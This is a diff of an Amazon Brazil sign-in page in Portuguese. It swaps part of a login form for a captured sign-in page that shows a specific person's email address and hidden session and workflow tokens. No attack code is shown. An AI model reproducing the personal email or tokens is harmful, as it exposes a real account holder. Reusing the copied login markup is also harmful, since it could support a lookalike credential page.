-                                href="https://www.amazon.com.br/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;signInRedirectToFPPThreshold=5&amp;pageId=brflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com.br%2Fb%2F%3Fie%3DUTF8%26node%3D6740748011%26tag%3Dhydrbrgk-20%26ref%3Dnav_custrec_signin%26adgrpid%3D84006465591%26hvpone%3D%26hvptwo%3D%26hvadid%3D595815666643%26hvpos%3D%26hvnetw%3Dg%26hvrand%3D533389925155143244%26hvqmt%3De%26hvdev%3Dc%26hvdvcmdl%3D%26hvlocint%3D%26hvlocphy%3D9100168%26hvtargid%3Dkwd-360364907677%26hydadcr%3D5764_13215255%26gclid%3DEAIaIQobChMI-IzOmPnkhQMVvV9IAB3HpgZmEAAYASAAEgIRjPD_BwE&amp;prevRID=QVBSK403ZWNZ5JJ5DD28&amp;openid.assoc_handle=brflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiI1U3FnWEN6QUpUODRETlo0amk1dXVhZkxqMUptOGZqZ0pTV0djMzJpUjNzPSIsIklWIjoicCtDUk5nR3k0UjRya0VqbzJYeis1Zz09IiwidmVyc2lvbiI6MX0%3D&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1714313842000"
-                              >
-                                Esqueci a senha
-                              </a>
-                            </div>
-                          </div>
-      
-                          <input
-                            type="password"
-                            maxlength="1024"
-                            id="ap_password"
-                            autocomplete="current-password"
-                            name="password"
-                            class="a-input-text a-span12 auth-autofocus auth-required-field"
-                            aria-describedby="Insira sua senha"
-                            aria-required="true"
-                          />
-      
-                          <div
-                            id="auth-password-missing-alert"
-                            class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini"
-                            role="alert"
-                          >
-                            <div class="a-box-inner a-alert-container">
-                              <i class="a-icon a-icon-alert"></i>
-                              <div class="a-alert-content">Insira sua senha</div>
-                            </div>
-                          </div>
-                        </div>
-      
-                        <input type="hidden" name="encryptedPasswordExpected" />
-      
-                        <div class="a-section">
-                          <span
-                            id="auth-signin-button"
-                            class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"
-                          >
-                            <span class="a-button-inner">
-                              <input
-                                id="signInSubmit"
-                                class="a-button-input"
-                                type="button"
-                                aria-labelledby="auth-signin-button-announce"
-                              />
-                              <span
-                                id="auth-signin-button-announce"
-                                class="a-button-text"
-                                aria-hidden="true"
-                              >
-                                Fazer login
-                              </span>
-                            </span>
-                          </span>
-                          <div class="a-row a-spacing-top-medium">
-                            <div class="a-section a-text-left">
-                              <label for="auth-remember-me" class="a-form-label">
-                                <div
-                                  data-a-input-name="rememberMe"
-                                  class="a-checkbox"
-                                >
-                                  <label>
-                                    <input
-                                      type="checkbox"
-                                      name="rememberMe"
-                                      value="true"
-                                    />
-                                      <i class="a-icon a-icon-checkbox"></i>
-                                      <span class="a-label a-checkbox-label">
-                                      Mantenha-me conectado.
-                                      <span
-                                        class="a-declarative"
-                                        data-action="a-popover"
-                                        data-csa-c-type="widget"
-                                        data-csa-c-func-deps="aui-da-a-popover"
-                                        data-a-popover='{"closeButtonLabel":"Fechar","activate":"onclick","header":"Caixa de seleção \"Mantenha-me conectado\"","inlineContent":"\u003cp>Escolher \"Mantenha-me conectado\" reduz o número de vezes que você terá que fazer login neste dispositivo.\u003c\/p>\r\n\u003cp>Para manter sua conta segura, utilize esta opção apenas em seus dispositivos pessoais.\u003c\/p>"}'
-                                        data-csa-c-id="tqf3e1-4fokgd-3au71d-6mgnc7"
-                                      >
-                                        <a
-                                          id="remember_me_learn_more_link"
-                                          href="javascript:void(0)"
-                                          role="button"
-                                          class="a-popover-trigger a-declarative"
-                                        >
-                                          Detalhes
-                                          <i class="a-icon a-icon-popover"></i>
-                                        </a>
-                                      </span>
-                                    </span>
-                                  </label>
-                                </div>
-                              </label>
-                            </div>
-                          </div>
-                        </div>
-                      </div>
-                      <input
-                        type="hidden"
-                        name="aaToken"
-                      />
-                    </form>
-                  </div>
-                </div>
+                  <li id="auth-customerName-missing-alert">
+                    <span class="a-list-item"> Insira seu nome </span>
+                  </li>
+                  <li id="auth-customerNamePronunciation-missing-alert">
+                    <span class="a-list-item">
+                      Insira a pronúncia de seu nome
+                    </span>
+                  </li>
+                  <li id="auth-phoneNumber-missing-alert">
+                    <span class="a-list-item">
+                      Insira o número do celular
+                    </span>
+                  </li>
+                  <li id="auth-phoneNumber-invalid-phone-alert">
+                    <span class="a-list-item">
+                      O número de celular inserido não parece ser válido
+                    </span>
+                  </li>
+                  <li id="auth-email-missing-alert">
+                    <span class="a-list-item">
+                      Digite seu e-mail ou número de telefone celular
+                    </span>
+                  </li>
+                  <li id="auth-password-missing-alert">
+                    <span class="a-list-item"> Insira sua senha </span>
+                  </li>
+                  <li id="auth-password-invalid-password-alert">
+                    <span class="a-list-item">
+                      As senhas devem ter pelo menos 6 caracteres.
+                    </span>
+                  </li>
+                  <li id="auth-guess-missing-alert">
+                    <span class="a-list-item">
+                      Insira os caracteres à medida que eles aparecem na imagem.
+                    </span>
+                  </li>
+                  <li id="auth-email-invalid-email-alert">
+                    <span class="a-list-item">
+                      Endereço de e-mail inválido.
+                    </span>
+                  </li>
+                  <li id="auth-signin-legal-agreement-checkbox-unchecked-alert">
+                    <span class="a-list-item"> </span>
+                  </li>
+                  <li id="auth-cbdtAgreementCheckBox-unchecked-alert">
+                    <span class="a-list-item">
+                      Para criar uma conta na Amazon, você deve concordar com
+                      nossas Condições de Uso e Vendas e com a Política de
+                      Privacidade.
+                    </span>
+                  </li>
+                </ul>
               </div>
             </div>
           </div>
+
+          <div
+            id="passkey-error-alert"
+            class="a-box a-alert a-alert-error aok-hidden"
+            role="alert"
+          >
+            <div class="a-box-inner a-alert-container">
+              <h4 class="a-alert-heading">Erro na chave de acesso</h4>
+              <div class="a-alert-content">
+                <p id="passkey-client-error-message">
+                  Algo deu errado. Faça login de outra forma ou siga as
+                  instruções fornecidas pelo seu dispositivo.
+                </p>
+                <p id="passkey-generic-server-error-message" class="aok-hidden">
+                  Desculpe, sua chave de acesso não está funcionando. O servidor
+                  pode estar com problema. Faça login com sua senha ou tente
+                  novamente com sua chave de acesso mais tarde.
+                </p>
+                <p id="passkey-server-error-message" class="aok-hidden"></p>
+              </div>
+            </div>
+          </div>
+
+          <h2>Fazer login</h2>
+
+          <div class="a-row a-spacing-base">
+            <span dir="ltr" id="current-email">davi.israel01@gmail.com</span>
+            <a
+              id="ap_change_login_claim"
+              class="a-link-normal"
+              tabindex="7"
+              href=".."
+            >
+              Alterar
+            </a>
+          </div>
+
+          <div
+            class="auth-validate-form auth-clearable-form auth-validate-form"
+          >
+            <input
+              type="hidden"
+              name="appActionToken"
+              value="oPxiNXIA5BzRGCRr2WZQ081kjUcj3D"
+            /><input
+              type="hidden"
+              name="appAction"
+              value="SIGNIN_PWD_COLLECT"
+            />
+
+            <input
+              type="hidden"
+              name="giveFocusOnMobileToFirstControlFailingValidation"
+              value="false"
+            />
+
+            <input
+              type="hidden"
+              name="metadata1"
+              value="ECdITeCs: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"
+            />
+
+            <input
+              type="hidden"
+              name="openid.return_to"
+              value="ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS5ici8/X2VuY29kaW5nPVVURjgmcmVmXz1uYXZtX2hkcl9zaWduaW4="
+            />
+
+            <input
+              type="hidden"
+              name="prevRID"
+              value="ape:N1o0Nzg4WTZBVFlOUzNIRjNXUVM="
+            />
+
+            <input
+              type="hidden"
+              name="workflowState"
+              value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.mNgHX1YVrwm8_KzUCmA6WVG0ibiH3tSs9ikAPqAE16XLgSeVdxNblw.fsi9ezSzFH7Svkvz.xC8vJHdv6B7GWIw59FIuEXAvcljVdorUG9iaTq_A3gtq3lypCFufCimi2u_zcD8A58e6GZ3zkPgHtXPcbKjWzUDEPvcLtx291TwW3vW54fQs3v1RXu8aJiaY0vuQzo0AZycbS4nFeTUsA7S3F89ay7ImoK7KNsZteH2a36QsH6of9u8TCKF5rYRJNoIwtbkGEI0YRa3S7L-LWQ6PEtKTToG-M-itGP_aFOErl9EiPN5EPZJ5EQL7SvxTGb9r1T2MDUEGLcNDx9-EvwPBz3vbcsbkEcJBFCBbSrvnAcSqCrjXsesUpYHq09oHbx0_HBWv52gVNznEtae8SgWqWC3jSC9TQ94LxuSmWrkxV85miC39OAtgU2mV4PiUWU6dG678gf6yn0OzOxyuYLTrSeL-EbjDCAjUojRYr7VRGdfZaL6UaWdsNBF2wATTdGOFx_4xPcRt0GzeIJlSPwSSDy88VcxVO2DmuDz0rITbikUf_AHKxSytdY2BxQPS3sMh_1cj079p3NpHDYIdX9YWxC0dv6vikvMkYg57YQM-JaU.9YO42CHQHDxoIgbsvHqmEg"
+            />
+
+            <input type="hidden" name="email" value="" />
+            <div
+              data-claim="davi.israel01@gmail.com"
+              class="a-input-text-wrapper hide"
+            >
+              <input
+                type="text"
+                value=""
+                id="ap-credential-autofill-hint"
+                autocomplete="email"
+                name="email"
+                class="auth-clear-icon-visible"
